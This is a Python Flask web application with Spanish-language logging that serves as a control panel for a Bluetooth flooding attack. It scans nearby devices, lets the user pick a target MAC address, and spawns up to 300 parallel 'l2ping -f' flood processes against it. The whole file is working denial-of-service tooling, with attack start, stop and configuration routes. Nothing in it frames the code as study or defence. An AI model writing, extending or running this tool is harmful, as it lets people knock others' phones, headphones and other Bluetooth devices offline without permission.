import os
import sys
import time
import re
import subprocess
import threading
import signal
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import eventlet

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

ATTACK_PROCESSES = []
ATTACK_RUNNING = False
TARGET_MAC = None
PACKET_SIZE = 600
NUM_THREADS = 300
SCAN_TIME = 5
LOG_MESSAGES = []

def log_message(msg, level='INFO'):
    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] [{level}] {msg}"
    LOG_MESSAGES.append(full_msg)
    if len(LOG_MESSAGES) > 100:
        LOG_MESSAGES.pop(0)
    socketio.emit('log', {'msg': full_msg})

def list_bluetooth_devices(wait_time):
    log_message(f"Iniciando escaneo por {wait_time} segundos...", 'INFO')
    process = subprocess.Popen(
        ['bluetoothctl'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    process.stdin.write("scan on\n")
    process.stdin.flush()
    time.sleep(wait_time)
    process.stdin.write("scan off\n")
    process.stdin.flush()
    process.stdin.write("devices\n")
    process.stdin.flush()
    output, _ = process.communicate()
    devices = []
    for line in output.splitlines():
        match = re.search(r"Device ([0-9A-F:]+)\s+(.*)", line)
        if match:
            address, name = match.groups()
            name = name.strip() or "Desconocido"
            devices.append((address, name))
    log_message(f"Escaneo completado: {len(devices)} dispositivo(s).", 'INFO')
    return devices

def stop_attack():
    global ATTACK_RUNNING, ATTACK_PROCESSES
    if not ATTACK_RUNNING:
        log_message("No hay ataque en curso.", 'WARNING')
        return
    log_message("Deteniendo ataque...", 'INFO')
    for proc in ATTACK_PROCESSES:
        if proc.poll() is None:
            proc.terminate()
    ATTACK_PROCESSES.clear()
    ATTACK_RUNNING = False
    socketio.emit('attack_status', {'running': False})
    log_message("Ataque detenido.", 'INFO')

def start_flood_thread(mac, packet_size, num_threads):
    global ATTACK_RUNNING, ATTACK_PROCESSES
    if not mac:
        log_message("No hay objetivo seleccionado.", 'ERROR')
        return
    if ATTACK_RUNNING:
        log_message("Ya hay un ataque en curso.", 'WARNING')
        return
    log_message(f"Iniciando ataque contra {mac} con {num_threads} hilos, tamaño {packet_size}", 'INFO')
    ATTACK_RUNNING = True
    socketio.emit('attack_status', {'running': True})
    for i in range(num_threads):
        cmd = ['l2ping', '-i', 'hci0', '-s', str(packet_size), '-f', mac]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ATTACK_PROCESSES.append(proc)
        if i % 50 == 0:
            time.sleep(0.05)
    log_message(f"Ataque lanzado con {num_threads} hilos.", 'INFO')
    for proc in ATTACK_PROCESSES:
        proc.wait()
    if ATTACK_RUNNING:
        ATTACK_RUNNING = False
        ATTACK_PROCESSES.clear()
        socketio.emit('attack_status', {'running': False})
        log_message("Ataque finalizado automáticamente.", 'INFO')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    devices = list_bluetooth_devices(SCAN_TIME)
    return jsonify({'devices': devices})

@app.route('/set_target', methods=['POST'])
def set_target():
    global TARGET_MAC
    data = request.get_json()
    mac = data.get('mac')
    if mac:
        TARGET_MAC = mac
        log_message(f"Objetivo seleccionado: {mac}", 'INFO')
        return jsonify({'status': 'ok', 'mac': mac})
    else:
        TARGET_MAC = None
        log_message("Objetivo deseleccionado.", 'INFO')
        return jsonify({'status': 'ok'})

@app.route('/start_attack', methods=['POST'])
def start_attack():
    if not TARGET_MAC:
        return jsonify({'status': 'error', 'msg': 'No hay objetivo seleccionado'}), 400
    thread = threading.Thread(target=start_flood_thread, args=(TARGET_MAC, PACKET_SIZE, NUM_THREADS))
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'ok'})

@app.route('/stop_attack', methods=['POST'])
def stop_attack_route():
    stop_attack()
    return jsonify({'status': 'ok'})

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'running': ATTACK_RUNNING,
        'target': TARGET_MAC,
        'packet_size': PACKET_SIZE,
        'threads': NUM_THREADS,
        'scan_time': SCAN_TIME,
        'logs': LOG_MESSAGES[-20:]
    })

@app.route('/config', methods=['POST'])
def config():
    global PACKET_SIZE, NUM_THREADS, SCAN_TIME
    data = request.get_json()
    if 'packet_size' in data:
        PACKET_SIZE = int(data['packet_size'])
    if 'threads' in data:
        NUM_THREADS = int(data['threads'])
    if 'scan_time' in data:
        SCAN_TIME = int(data['scan_time'])
    log_message(f"Config actualizada: tamaño={PACKET_SIZE}, hilos={NUM_THREADS}, scan={SCAN_TIME}s", 'INFO')
    return jsonify({'status': 'ok'})

def signal_handler(sig, frame):
    print("\n🛑 Interrupción recibida. Deteniendo ataque...")
    stop_attack()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("⚠️  Ejecuta con sudo: sudo python3 app.py")
        sys.exit(1)
    if subprocess.run(['which', 'l2ping'], capture_output=True).returncode != 0:
        print("❌ l2ping no encontrado. Instala: sudo apt install bluez")
        sys.exit(1)
    print("🚀 Servidor en http://127.0.0.1:5000")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
